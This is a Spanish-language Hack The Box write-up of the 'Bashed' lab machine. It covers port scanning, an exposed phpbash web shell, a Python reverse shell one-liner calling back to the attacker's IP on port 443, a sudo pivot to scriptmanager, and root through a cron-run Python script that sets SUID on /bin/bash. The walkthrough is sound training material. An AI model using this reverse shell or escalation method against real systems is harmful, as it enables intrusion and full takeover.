---
title: Hack The Box Bashed
author: k4miyo
date: 2022-01-02
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [File Misconfiguration, Web]
ping: true
---

## Bashed
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.68.

```bash
❯ ping -c 1 10.10.10.68
PING 10.10.10.68 (10.10.10.68) 56(84) bytes of data.
64 bytes from 10.10.10.68: icmp_seq=1 ttl=63 time=143 ms

--- 10.10.10.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 142.530/142.530/142.530/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.68 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 18:34 CST
Initiating Ping Scan at 18:34
Scanning 10.10.10.68 [4 ports]
Completed Ping Scan at 18:34, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:34
Scanning 10.10.10.68 [65535 ports]
Discovered open port 80/tcp on 10.10.10.68
SYN Stealth Scan Timing: About 43.17% done; ETC: 18:35 (0:00:41 remaining)
Completed SYN Stealth Scan at 18:35, 64.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.68
Host is up (0.20s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 64.95 seconds
           Raw packets sent: 67158 (2.955MB) | Rcvd: 67155 (2.686MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.68
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p80 10.10.10.68 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 18:44 CST
Nmap scan report for 10.10.10.68
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
```

Tenemos sólo el puerto 80 abierto, así que como siempre, antes de ver el contenido vía web, vamos a ocupar la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.68/
http://10.10.10.68/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

Por el momento no vemos nada interesante, así que ahora si vamos a ver el contenido vía web.

![](/assets/images/htb-bashed/bashed-web.png)

Analizando un poco el sitio web, vemos que cuenta con un recurso llamado `single.html` en el cual nos hablando de ***phpbash*** y nos dan la pista que se encuentra en el servidor.

![](/assets/images/htb-bashed/bashed-web1.png)

Antes de tirar con herramientas tochas, vamos a tratar de descubrir rutas en el servidor mediante `nmap`:

```bash
❯ nmap --script http-enum -p80 10.10.10.68 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 18:45 CST
Nmap scan report for 10.10.10.68
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
```

Aqui ya vemos varios recursos que nos pueden llamadar la atención y empezaremos con `/dev/` y nos encontramos el proyecto del que nos hablan ***phpbash***:

![](/assets/images/htb-bashed/bashed-web2.png)

![](/assets/images/htb-bashed/bashed-web3.png)

Vemos que podemos ejecutar comandos a nivel de sistema; tanto en `phpbash.min.php` como en `phpbash.php`. Podriamos pensar que con dicha herramienta ya tenemos ejecución de comandos y podemos entablarnos una reverse shell, y es correcto. Para este caso, validamos primero que cuente con python y posteriormente nos pusimos en escucha por el puerto 443 y mandamos una reverse shell.

![](/assets/images/htb-bashed/bashed-web4.png)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.68] 57542
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Como siempre y para trabajar maś cómodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ya nos encontramos dentro de la máquina como el usuario **www-data** y podemos visualizar la flag (user.txt). Vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.

```bash
www-data@bashed:/home/arrexel$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/arrexel$
```

Y vemos que podemos ejecutar cualquier comando como el usuario **scriptmanager**; asi que podemos migrar fácilmente a dicho usuario:

```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
scriptmanager@bashed:/home/arrexel$
```

Ya como el usuario **scriptmanager** podemos intuir que deben existir recursos asociados a dicho usuario, así que realizaremos una búsqueda.

```bash
scriptmanager@bashed:/$ find \-user scriptmanager 2>/dev/null | grep -v "proc"
./scripts
./scripts/test.py
./home/scriptmanager
./home/scriptmanager/.profile
./home/scriptmanager/.bashrc
./home/scriptmanager/.nano
./home/scriptmanager/.bash_history
./home/scriptmanager/.bash_logout
scriptmanager@bashed:/$
```

Tenemos un script en python bajo la ruta `/scripts`, así que vamos a echarle un ojito.

```bash
scriptmanager@bashed:/$ cd scripts/
scriptmanager@bashed:/scripts$ ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Jan  2 17:24 test.txt
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!scriptmanager@bashed:/scripts$ cat test.txt; echo
testing 123!
scriptmanager@bashed:/scripts$
```

A este punto ya debemos estar pensando que se debe ejecutar una tarea a intervalos regulares y que posiblemente **root** ejecutar el script, ya que el resultado es un archivo llamado `test.txt` cuyo propietario es **root**. Para validarlo, podemos crear nuestro archivo de confianza [ProcMon](/posts/procmon) en una ruta donde tengamos privilegios `/dev/shm`.

```bash
scriptmanager@bashed:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
> [python] <defunct>
< /usr/sbin/CRON -f
< /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
< [python] <defunct>
^C
scriptmanager@bashed:/dev/shm$
```

Por lo tanto, como tenemos permisos de escrita para el archivo `test.py`, vamos a modificarlo para dar permisos SUID a `/bin/bash`.

```python
import os

os.system("chmod 4755 /bin/bash")
```

Ahora esperamos a que **root** nos ejecute el script y podamos ejecutar `bash -p` para ganar acceso como dicho dicho usuario.

```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
bash-4.3# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt). Se comparte autopwn de la máquina [Bashed_Autopwn](https://github.com/k4miyo/Bashed-Autopwn)
